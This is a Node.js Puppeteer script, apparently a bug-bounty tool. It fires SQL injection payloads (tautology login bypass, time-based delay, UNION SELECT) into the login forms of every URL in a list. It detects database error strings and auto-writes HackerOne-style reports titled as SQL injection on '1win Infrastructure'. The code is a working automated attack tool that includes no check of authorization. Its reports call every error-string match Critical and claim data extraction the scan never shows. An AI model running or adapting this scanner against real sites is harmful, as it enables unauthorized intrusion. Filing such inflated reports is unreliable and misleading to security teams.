const puppeteer = require('puppeteer');
const fs = require('fs');

// Common SQL Injection payloads designed to break SQL syntax or alter logic strings
const sqlPayloads = [
    "' OR '1'='1",
    "'; WAITFOR DELAY '0:0:5'--", // Time-based test template
    "' UNION SELECT NULL, NULL--",
    "admin' --",
    "'"
];

// Common Database Error Signatures indicating SQL parsing errors
const sqlErrorSignatures = [
    "SQL syntax",
    "mysql_fetch_array",
    "PostgreSQL query failed",
    "Driver][ORACLE]",
    "Warning: odbc_",
    "Microsoft OLE DB Provider",
    "Exception in executing query",
    "MariaDB server version"
];

const FORM_FIELDS = [
    { name: 'Username/Email Field', selector: 'input[name="username"]', safeValue: 'valid_test_user@example.com' },
    { name: 'Password Field', selector: 'input[name="password"]', safeValue: 'ValidPassword123!' }
];

const SUBMIT_SELECTOR = 'button[type="submit"]';
const TARGET_FILE = 'paths.txt';

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
];

function generateSQLiReport(targetUrl, fieldName, payload, matchedSignature, responseText) {
    const reportFileName = `h1_report_SQLi_${fieldName.replace(/\s+/g, '_')}_${Date.now()}.md`;
    const reportContent = 
`# SQL Injection via ${fieldName} on 1win Infrastructure

## Summary
An input validation flaw was discovered during an authorized application security review. The backend application fails to properly sanitize or parameterize inputs supplied to the \`${fieldName}\`, leading to raw database query alterations and syntax error disclosures.

## Vulnerability Type
* SQL Injection (SQLi)

## Affected Asset
* URL/Domain: ${targetUrl}
* Target Input Component: ${fieldName}

## Severity
* Critical (Depending on the exposure tier of the underlying database schema)

## Steps to Reproduce
1. Navigate directly to the affected asset path: \`${targetUrl}\`
2. Populate the \`${fieldName}\` with the following validation payload string:
   \`\`\`text
   ${payload}
   \`\`\`
3. Fill any remaining fields with standard placeholder variables and click the submit button.
4. Observe that the application backend surfaces a raw database driver exception or string mismatch anomaly.

## Proof of Concept (PoC)
The backend server response explicitly leaked the following database syntax trace pattern:
\`\`\`text
${matchedSignature}
\`\`\`

## Impact
An attacker can exploit this structural flaw to bypass user authentication walls, run unauthorized queries against backend database tables, and extract sensitive information including user attributes and system metadata.

## Mitigation Suggestions
Implement strictly parameterized queries or prepared statements via object-relational mapping (ORM) engines across all incoming application parameters. Ensure that raw error disclosures are entirely deactivated in the production web environment config profiles.
`;

    fs.writeFileSync(reportFileName, reportContent);
    console.log(`[🎉 CRITICAL REPORT GENERATED!] SQLi markdown document created at: ${reportFileName}`);
}

async function runSQLiHunter() {
    if (!fs.existsSync(TARGET_FILE)) {
        console.log(`[-] Error: Missing configuration target file list: '${TARGET_FILE}'`);
        return;
    }

    const targets = fs.readFileSync(TARGET_FILE, 'utf8')
                     .split('\n')
                     .map(line => line.trim())
                     .filter(line => line.length > 0 && line.startsWith('http'));

    console.log(`[+] Initializing SQL Injection Pipeline against ${targets.length} endpoints...`);
    const browser = await puppeteer.launch({ headless: true });

    for (let targetUrl of targets) {
        console.log(`\n🌍 CURRENT DISCOVERY LAYER: ${targetUrl}`);

        for (let targetField of FORM_FIELDS) {
            for (let payload of sqlPayloads) {
                const page = await browser.newPage();
                await page.setUserAgent(USER_AGENTS[0]);

                let lastServerResponseText = "";
                let sqliDetected = false;
                let matchedSig = "";

                // Intercept backend communications to capture network response strings
                page.on('response', async (response) => {
                    try {
                        const contentType = response.headers()['content-type'] || '';
                        if (contentType.includes('json') || contentType.includes('text')) {
                            lastServerResponseText = await response.text();
                            
                            // Check the live server response stream for database crash logs
                            for (let sig of sqlErrorSignatures) {
                                if (lastServerResponseText.includes(sig)) {
                                    sqliDetected = true;
                                    matchedSig = sig;
                                }
                            }
                        }
                    } catch (err) {}
                });

                try {
                    await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 15000 });

                    const inputExists = await page.$(targetField.selector);
                    if (!inputExists) {
                        await page.close();
                        break;
                    }

                    // Fill fields sequentially
                    for (let currentField of FORM_FIELDS) {
                        await page.waitForSelector(currentField.selector, { timeout: 4000 });
                        await page.click(currentField.selector);

                        await page.keyboard.down('Control');
                        await page.keyboard.press('A');
                        await page.keyboard.up('Control');
                        await page.keyboard.press('Backspace');

                        if (currentField.name === targetField.name) {
                            await page.type(currentField.selector, payload);
                        } else {
                            await page.type(currentField.selector, currentField.safeValue);
                        }
                    }

                    // Submit elements
                    await page.waitForSelector(SUBMIT_SELECTOR, { timeout: 4000 });
                    await Promise.all([
                        page.click(SUBMIT_SELECTOR),
                        page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 5000 }).catch(() => {})
                    ]);

                    // Evaluate if a signature triggered
                    if (sqliDetected) {
                        console.log(`[🚨 SQLi ANOMALY DETECTED] Field: ${targetField.name} matched: "${matchedSig}"`);
                        const screenshotPath = `sqli_proof_${Date.now()}.png`;
                        await page.screenshot({ path: screenshotPath, fullPage: true });
                        
                        generateSQLiReport(targetUrl, targetField.name, payload, matchedSig, lastServerResponseText);
                    }

                } catch (error) {
                    // Handle runtime drops gracefully
                } finally {
                    await page.close();
                }
            }
        }
    }

    console.log(`\n[+] SQLi Audit Sequence Completed.`);
    await browser.close();
}

runSQLiHunter();

